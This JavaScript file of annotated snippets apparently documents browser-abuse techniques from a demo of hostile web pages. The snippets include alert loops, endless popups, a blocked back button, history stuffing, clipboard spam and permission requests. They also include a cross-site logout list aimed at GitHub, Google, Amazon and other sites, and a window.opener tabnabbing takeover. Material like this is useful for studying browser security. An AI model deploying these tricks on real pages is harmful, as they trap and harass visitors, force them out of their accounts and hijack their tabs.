//1. older browsers were single threaded so the only way to get out of the site(loop)
//was to close the browser entirely. Now the browsers are single threaded so that particular
// site can be closed.
function whileloop(){
    const messages = [
        'Hi there!',
        'Welcome to my awesome website',
        'I am glad that you made it here',
        'While I have you trapped here, listen up!',
        'Once upon a time...',
    ]
    while (true) {
       messages.forEach(window.alert)
    }
}

//2. Open new windows on user initiated events (clicks, keyboard events etc)
const win = window.open('','', 'width=100,height=100')
document.addEventListener('click', () => {
   const win = window.open('', '', 'width=100,height=100')
   win.moveTo(10, 10)
   win.resizeTo(200, 200)
})
//Move the window around in time intervals to extra annoying
let i = 0
setInterval(() => {
    win.moveTo(i, i)
    i = (i + 5) % 200
}, 100)

//3. intercept all user events -- call onInput on all user events
function interceptUserInput (onInput) {
    document.body.addEventListener('touchstart', onInput, { passive: false })
    document.body.addEventListener('mousedown', onInput)
    document.body.addEventListener('mouseup', onInput)
    document.body.addEventListener('click', onInput)
    document.body.addEventListener('keydown', onInput)
    document.body.addEventListener('keyup', onInput)
    document.body.addEventListener('keypress', onInput)
}

//4. Open child window
function openWindow () {
    const { x, y } = getRandomCoords()
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
    const win = window.open(window.location.pathname, '', opts)
    // New windows may be blocked by the popup blocker
    if (!win) return
    wins.push(win)
}
interceptUserInput(event => {
    event.preventDefault()
    event.stopPropagation()
    openWindow()
})

//5. focus all windows on-click
function focusWindows () {
   wins.forEach(win => {
   if (!win.closed) win.focus()
   })
}

//5. Bounce windows off the screen
function moveWindowBounce () {
    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

    window.setInterval(() => {
        const x = window.screenX
        const y = window.screenY
        const width = window.outerWidth
        const height = window.outerHeight
        if (x < MARGIN) vx = Math.abs(vx)
        if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
        if (y < MARGIN + 20) vy = Math.abs(vy)
        if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
        window.moveBy(vx, vy)
    }, TICK_LENGTH)
}

// 6. Play random videos on the window
const VIDEOS = [
    'albundy.mp4', 'badger.mp4', 'cat.mp4', 'hasan.mp4', 'heman.mp4',
    'jozin.mp4', 'nyan.mp4', 'rickroll.mp4', 'space.mp4', 'trolol.mp4'
]
function startVideo () {
    const video = document.createElement('video')
    video.src = getRandomArrayEntry(VIDEOS)
    video.autoplay = true
    video.loop = true
    video.style = 'width: 100%; height: 100%;'
    document.body.appendChild(video)
}

//7. show a modal to prevent window close
function showModal () {
    if (Math.random() < 0.5) {
        showAlert()
    } else {
        window.print()
    }
}

function showAlert () {
    const randomArt = getRandomArrayEntry(ART)
    const longAlertText = Array(200).join(randomArt)
    window.alert(longAlertText)
}
//show modal on time intervals
function startAlertInterval () {
    setInterval(() => {
    showModal()
    }, 30000)
}

//8. Confirm page unload
function confirmPageUnload () {
    window.addEventListener('beforeunload', event => {
        event.returnValue = true
    })
}

//9. Disable back button
function blockBackButton () {
    window.addEventListener('popstate', () => {
        window.history.forward()
    })
}

//10. Fill the browser history with extra entinties
function fillHistory () {
    for (let i = 1; i < 20; i++) {
        window.history.pushState({}, '', window.location.pathname + '?q=' + i)
    }
    // Set location back to the initial location, so user does not notice
    window.history.pushState({}, '', window.location.pathname)
}

//11. Copy spam to user clipboard
const ART = [
    `
   ░░▓▓░░░░░░░░▓▓░░
   ░▓▒▒▓░░░░░░▓▒▒▓░
   ░▓▒▒▒▓░░░░▓▒▒▒▓░
   ░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
   ░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
   ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
   ▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
   ▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
   ▓▒░░▒▒▒▒▒▒▒▒▒░░▓
   ▓▒░░▒▓▒▒▓▒▒▓▒░░▓
   ░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
   ░░▓▒▒▒▒▒▒▒▒▒▒▓░░
   ░░░▓▓▓▓▓▓▓▓▓▓░░░
    `
   ]
function copySpamToClipboard () {
    const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
    clipboardCopy(randomArt)
}

//12. Register protocol handlers
function registerProtocolHandlers () {
    const protocolWhitelist = [
        'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto',
        'mms', 'news', 'ircs', 'nntp', 'sip', 'sms', 'smsto', 'ssh',
        'tel', 'urn', 'webcal', 'wtai', 'xmpp'
    ]
    const handlerUrl = window.location.href + '/url=%s'
    protocolWhitelist.forEach(proto => {
        navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
    })
}

//13. Request camera ans Mic access
function requestCameraAndMic () {
    navigator.mediaDevices.enumerateDevices().then(devices => {
        const cameras = devices.filter((device) => device.kind === 'videoinput')
        if (cameras.length === 0) return
        const camera = cameras[cameras.length - 1]
        navigator.mediaDevices.getUserMedia({
            deviceId: camera.deviceId,
            facingMode: ['user', 'environment'],
            audio: true, video: true
        }).then(stream => {
            const track = stream.getVideoTracks()[0]
            const imageCapture = new window.ImageCapture(track)
            imageCapture.getPhotoCapabilities().then(() => {
            // Let there be light!
            track.applyConstraints({ advanced: [{torch: true}] })
            }, () => { /* No torch on this device */ })
        }, () => { /* ignore errors */ })
    })
}

//14. Start vibrate interval
function startVibrateInterval () {
    setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
    }, 1000)
}

//15. Start picture-in-picture video
function startInvisiblePictureInPictureVideo () {
    const video = document.createElement('video')
    video.src = getRandomArrayEntry(VIDEOS)
    video.autoplay = true
    video.loop = true
    video.muted = true
    video.style = HIDDEN_STYLE
    document.body.appendChild(video)
}

function enablePictureInPicture () {
    const video = document.querySelector('video')
    if (video.webkitSetPresentationMode) {
    video.muted = false
    video.webkitSetPresentationMode('picture-in-picture')
   }
}

//16. Hide the cursor
function hideCursor () {
    document.querySelector('html').style = 'cursor: none;'
}

//17. Trigger file downloads
const FILE_DOWNLOADS = [
    'cat-blue-eyes.jpg', 'cat-ceiling.jpg', 'cat-crosseyes.jpg',
    'cat-cute.jpg', 'cat-hover.jpg', 'cat-marshmellows.jpg',
    'cat-small-face.jpg', 'cat-smirk.jpg'
]
function triggerFileDownload () {
    const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
    const a = document.createElement('a')
    a.href = fileName
    a.download = fileName
    a.click()
}

//18. Make browser full-screen
function requestFullscreen () {
    const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen
    requestFullscreen.call(document.body)
}

//19. Log user out of popular sites
const LOGOUT_SITES = {
    'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
    'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
    'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
    'Blogger': ['GET', 'https://www.blogger.com/logout.g'],
    'Delicious': ['GET', 'https://www.delicious.com/logout'], // works!
    'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
    'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
    'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
    'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
    'Gandi': ['GET', 'https://www.gandi.net/login/out'],
    'GitHub': ['GET', 'https://github.com/logout'],
    'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
    'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
    'Hulu': ['GET', 'https://secure.hulu.com/logout'],
    'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
    'Linode': ['GET', 'https://manager.linode.com/session/logout'],
    'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
    'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
}
//Superlogout.com
function superLogout () {
    for (let name in LOGOUT_SITES) {
        const method = LOGOUT_SITES[name][0]
        const url = LOGOUT_SITES[name][1]
        const params = LOGOUT_SITES[name][2] || {}
        if (method === 'GET') {
            get(url)
        } else {
            post(url, params)
        }   
        const div = document.createElement('div')
        div.innerText = `Logging you out from ${name}...`
        const logoutMessages = document.querySelector('.logout-messages')
        logoutMessages.appendChild(div)
    }
}

//20. Do bad searches
const SEARCHES = [
    'where should i bury the hatchet',
    'why does my eye twitch',
    'why is my poop blue',
    'why am i dancing',
]

function setupSearchWindow (win) {
    if (!win) return
    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
    let searchIndex = 1
    let interval = setInterval(() => {
        if (searchIndex >= SEARCHES.length) {
            clearInterval(interval)
            win.window.location = window.location.pathname
            return
        }
        if (win.closed) {
            clearInterval(interval)
            onCloseWindow(win)
            return
        }
        win.window.location = window.location.pathname
        setTimeout(() => {
            const { x, y } = getRandomCoords()
            win.moveTo(x, y)
            win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
            searchIndex += 1
            }, 500)
    }, 2500)
}

//21. Tab nabbing
//<a href='https://example.com' target='_blank'>External Website</a>
function isParentSameOrigin () {
    try {
        // May throw an exception if `window.opener` is on another origin
        return window.opener.location.origin === window.location.origin
        } catch (err) {
        return false
    }
}
function attemptToTakeoverReferrerWindow () {
    if (!isParentSameOrigin()) {
        window.opener.location = `${window.location.origin}/?child=true`
    }
}

//22. creating domain with unicode charaters from different languages which look similar
//to famous domain names